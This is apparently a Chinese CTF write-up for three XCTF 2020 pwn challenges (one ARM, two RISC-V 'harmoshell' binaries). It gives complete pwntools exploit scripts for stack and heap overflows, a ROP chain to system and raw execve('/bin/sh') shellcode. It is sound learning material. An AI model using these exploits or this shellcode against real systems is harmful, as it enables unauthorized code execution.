---
layout:     post
title:      XCTF pwn复现
subtitle:   HarmonyOS和HMS专场
date:       2021-01-09
author:     X1ng
header-img: XCTF2020.jpg
catalog: true
tags:
    - XCTF2020
    - wp

---

发现队友全都咕咕咕了，，然后我也咕咕咕了（就算不摸鱼也做不出来呀

前两场被打的很自闭，第三场题目甚至下载了都没有解压，赛后复现一下第三场的pwn

## pwn1

[附件](https://github.com/X1ngn/ctf/blob/master/pwn1.zip)

例行检查

![](https://tva1.sinaimg.cn/large/0081Kckwly1gm6dbcko44j31um04i0tm.jpg)

arm文件，只开了NX保护，但是没有ld很懵

https://www.cnblogs.com/zq10/p/13207370.html：

```
sudo apt-get install libc6-armhf-cross
patchelf --set-interpreter /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 bin
patchelf --set-rpath /usr/arm-linux-gnueabihf/lib/ bin
```

虽然kali下载的libc与题目给的libc文件都是2.31，但是patchelf题目给的libc会出现段错误，只能用自己的libc先调一调

ida打开

![](https://tva1.sinaimg.cn/large/0081Kckwly1gm6dc6ljnyj31hu0jmwfa.jpg)

惊了，居然是栈溢出，但是有NX保护，需要用ROP

并且没有开启pie，libc加载地址是固定的，可以用ROPgadget找libc中的gadget，直接调用system

看来是白给题，exp用了自己的libc

exp：

```python
#!/usr/bin/python

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'

local=1
binary_name='bin'
libc_name='libc-2.31.so'

libc=ELF("./"+libc_name)
e=ELF("./"+binary_name)

if local:
    p = process(["qemu-arm-static", "./"+binary_name])
else:
    p=remote('',)

def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
      
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))
    
libcbase = 0x3fed4000
p_r0_r4 = libcbase+0x0005bcbc
bin_sh = libcbase+0x000dc9e8

system = libcbase+libc.sym['system']
print(hex(system))

sla('input:',b'a'*0x104+p32(p_r0_r4)+p32(bin_sh)+p32(0)+p32(system))    
ia()
```



## harmoshell

[附件](https://github.com/X1ngn/ctf/blob/master/pwn_harmoshell.zip)

- 神奇的RISC-V架构，ida不支持，后来才知道可以用9.2版本以上的[ghidra](https://ghidra-sre.org/)打开

- 汇编代码有种ARM的感觉，所以比较简单的语句大致可以看懂（猜到

- 调试的时候pwngdb也不支持，还得把pwngdb关掉

    ```
    vim ~/.gdbinit
    ```

    把pwndbg的那一行注释掉

- gdb调试

    ```
    gdb-multiarch harmoshell2
    set arch riscv:rv64
    target remote :1234
    ```

例行检查

![](https://tva1.sinaimg.cn/large/0081Kckwly1gm6fgdotxrj31x604gmxz.jpg)

保护全关

随便运行一下，程序跟题目名称描述的一样，实现了shell的功能

```shell
./qemu-riscv64 -L libs harmoshel
```

![](https://tva1.sinaimg.cn/large/008eGmZEly1gme8n71jfgj30qq06ojrf.jpg)

菜鸡如我看不懂汇编

ghidra打开

![](https://tva1.sinaimg.cn/large/008eGmZEly1gme8nc3glnj313y0u0jwh.jpg)

找到主函数，进入`FUN_00011550`可以发现实现了ls,touch,echo,cat,rm,exit六个功能

可以将函数命名为其所实现的功能

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmefmfwyisj31330u0wj0.jpg)

是类似shell功能的菜单题，touch类似add、echo类似edit、rm类似delete

逆向能力为负，没审出来漏洞，网上找wp说漏洞在实现echo的函数，所以重点分析一下echo函数

echo函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmeaf3symyj30u00wp0z6.jpg)

经过测试echo使用方法为

```shell
$ echo > a
aaa
$ echo >> a
bbb
```

与linux下的echo一样">"表示内容覆盖原“文件”，">>"表示内容追加在原“文件”后面，只是 是在输入echo命令之后的下次输入才能输入内容

在ghidra上看到的伪代码里调用echo函数的时候没有参数，而函数里面又需要参数，在调用echo函数的地方下断点

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmeb2l9yu4j30zm0320sr.jpg)

查看寄存器

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmefkccfo3j30x20titcx.jpg)

可以看到调用echo时的a0寄存器的值，也就是作为参数的地址

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmeb4mijnpj30xs0cgq3n.jpg)

经过动调可以找到echo后面的字符串，在echo函数里作为strcmp的参数

echo函数中通过`read(0,auStack320,__nbytes);`，往栈中`auStack320 [264];`数组里写入__nbytes个字节

gdb调一下发现在echo不存在的文件的时候可以输入0x200个字节

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmef0v3ze9j30qe0tkta7.jpg)

输入0x200个字符可以造成栈溢出

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmef1g9edcj30u00x5ack.jpg)

由于pie和NX，什么栈地址、libc加载地址都是固定的，所以一开始想直接在栈中布置shellcode，覆盖返回地址到shellcode，google到一段执行`execve("/bin/sh", NULL, 0)`的shellcode

```python
#from http://shell-storm.org/shellcode/files/shellcode-908.php

shellcode =  b'\x01\x11'#addi sp, sp, -32

shellcode =  b'\x06\xec'#sd ra, 24(sp)

shellcode =  b'\x22\xe8'#sd s0, 16(sp)

shellcode += b'\x13\x04\x21\x02'#addi s0, sp, 34

shellcode += b'\xb7\x67\x69\x6e'#lui a5, 0x6e696

shellcode += b'\x93\x87\xf7\x22'#addi a5, a5, 559

shellcode += b'\x23\x30\xf4\xfe'#sd a5, -32(s0)

shellcode += b'\xb7\x77\x68\x10'#lui a5, 0x10687

shellcode += b'\x33\x48\x08\x01'#xor a6, a6, a6

shellcode += b'\x05\x08'#addi a6, a6, 1

shellcode += b'\x72\x08'#slli a6, a6, 0x1c

shellcode += b'\xb3\x87\x07\x41'#sub a5, a5, a6

shellcode += b'\x93\x87\xf7\x32'#addi a5, a5, 815

shellcode += b'\x23\x32\xf4\xfe'#sd a5, -28(s0)

shellcode += b'\x93\x07\x04\xfe'#addi a5, s0, -32

shellcode += b'\x01\x46'#li a2, 0

shellcode += b'\x81\x45'#li a1, 0

shellcode += b'\x3e\x85'#mv a0, a5

shellcode += b'\x93\x08\xd0\x0d'#li a7, 221

shellcode += b'\x93\x06\x30\x07'#li a3, 115

shellcode += b'\x23\x0e\xd1\xee'#sb a3, -260(sp)

shellcode += b'\x93\x06\xe1\xef'#addi a3, sp, -258

shellcode += b'\x67\x80\xe6\xff'#jr -2(a3)

```

但是可能是由于在栈中操作的原因没有成功执行

动调在echo函数的ret处下断点

可以发现此时寄存器的情况如下

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmfauetf2aj30qq0z0wgg.jpg)

作为函数调用第一个参数的a0所指向的地址居然是`echo > aaaaaaaa`中的`aaaaaaaa`

那么连rop都省了，直接`echo > /bin/sh`，再通过gdb查看got表中的libc地址计算system函数地址来覆盖返回地址

exp：

```python
#!/usr/bin/python

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'

local=1
binary_name='harmoshell'
libc_name='libc-2.27.so'

libc=ELF("./libs/lib/"+libc_name)
e=ELF("./"+binary_name)

if local:
	#p = process(["./qemu-riscv64",'-g','1234', "-L", "./libs", './'+binary_name])
    
	p = process(["./qemu-riscv64", "-L", "./libs", './'+binary_name])
else:
    p=remote('',)

def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))


libcbase = 0x00000040009a5a4e-libc.sym['__libc_start_main']
system = libcbase+libc.sym['system']
print(hex(system))

sla('$','echo > /bin/sh')
sl(b'\x00'*0x138+p64(system))
 
ia()

```



## harmoshell2

[附件](https://github.com/X1ngn/ctf/blob/master/pwn_harmoshell2.zip)

例行检查

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmfc8njqqhj31ye04i74x.jpg)

也是保护全关

ghidra打开，与上题类似的功能

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmfc8tj9xsj30u0148q8k.jpg)

由于没有pie，程序各种地址基本不需要泄露了，ls、cat等有可能造成地址泄露的函数不是很重要

touch函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmghf05ox6j30u016zwnq.jpg)

申请一个0x28大小的chunk用来维护每个文件的结构体

```c
struct file{
  char name[0x10];
  char *content;
  int size;
}
```

再申请一个0x100大小的chunk来保存content数据

rm函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmghf9b2boj313c0ncwgd.jpg)

echo函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmgh8bn23hj30vb0u0grk.jpg)

其中echo函数最后调用了`FUN_00011384`函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmghnw1oo7j313w0qadhh.jpg)

用memcpy向堆地址中复制输入的内容

这里的反汇编似乎有些问题，应该是通过判断参数4是否为0来判断用户输入的是">"还是">>"，即是覆盖还是追加

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmgi2rupomj31op0u011h.jpg)

这里如果追加输入的话，可能覆盖content大于0x100字节的范围，存在一个堆溢出漏洞

在对一个文件进行`"echo > " + (0x100个字节)`后堆中的情况如下

![](https://tva1.sinaimg.cn/large/008eGmZEgy1gmhfiox70bj30q40titar.jpg)

之后再进行`"echo >> "`操作会直接从`0x26010`开始写，也就是说我们可以控制下一个“文件”的数据结构

```c
struct file{
  char name[0x10];
  char *content;
  int size;
}
```

所以我们可以通过覆盖下一个“文件”结构体中的`content`指针配合echo来进行任意地址写

而栈上的地址都是固定的

![](https://tva1.sinaimg.cn/large/008eGmZEly1gmhfxvwnwtj30q609sjs4.jpg)

由于ROP_gadget以及one_gadget都不支持该架构，所以我的做法是将上题找到的shellcode填充到堆地址中，再任意地址写覆盖返回地址，挟持ip指针跳转到shellcode上

exp：

```python
#!/usr/bin/python

from pwn import *
import sys
import time

context.log_level = 'debug'
context.arch='amd64'

local=1
binary_name='harmoshell2'
libc_name='libc-2.27.so'

libc=ELF("./libs/lib/"+libc_name)
e=ELF("./"+binary_name)

if local:
	#p = process(["./qemu-riscv64",'-g','1234', "-L", "./libs", './'+binary_name])
    
	p = process(["./qemu-riscv64", "-L", "./libs", './'+binary_name])
else:
    p=remote('',)



def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
      
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))


def touch(name):
	sla('$',b'touch '+name)

def rm(name):
	sla('$',b'rm '+name)
	
def echo1(name,con):
	sla('$',b'echo > '+name)
	time.sleep(0.5)
	sl(con)

def echo2(name,con):
	sla('$',b'echo >> '+name)
	time.sleep(0.5)
	sl(con)

shellcode =  b'\x01\x11\x06\xec\x22\xe8\x13\x04'
shellcode += b'\x21\x02\xb7\x67\x69\x6e\x93\x87'
shellcode += b'\xf7\x22\x23\x30\xf4\xfe\xb7\x77'
shellcode += b'\x68\x10\x33\x48\x08\x01\x05\x08'
shellcode += b'\x72\x08\xb3\x87\x07\x41\x93\x87'
shellcode += b'\xf7\x32\x23\x32\xf4\xfe\x93\x07'
shellcode += b'\x04\xfe\x01\x46\x81\x45\x3e\x85'
shellcode += b'\x93\x08\xd0\x0d\x93\x06\x30\x07'
shellcode += b'\x23\x0e\xd1\xee\x93\x06\xe1\xef'
shellcode += b'\x67\x80\xe6\xff'

touch(b'X1ng')
touch(b'X2ng')
touch(b'X3ng')

echo1(b'X1ng',shellcode+b'a'*(0xff-len(shellcode)))
echo2(b'X1ng',p64(0)+p64(0x31)+p64(0x676e3258)+p64(0)+p64(0x40007ffed8)+p64(0x100))
echo1(b'X2ng',p64(0x25f10))

ia()
```





## 总结

还是第一次用原汁原味的gdb调试，后来才知道似乎很多师傅都是直接gdb看汇编+调试出来的，，tql or2

虽然都是很简单的利用，但是在代码量略大的情况下菜鸡如我就很难发现漏洞了，果然还是没有一双善于发现漏洞的眼睛



>参考资料
>
>[XCTF华为专场 三道RISC-V Pwn](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/28/riscv/#)
>
>[XCTF高校网络安全专题挑战赛-HarmonyOS和HMS专场 官方Writeup](https://www.xctf.org.cn/library/details/5acdc1c31cf4935ac38fce445978888a5710cf11/)
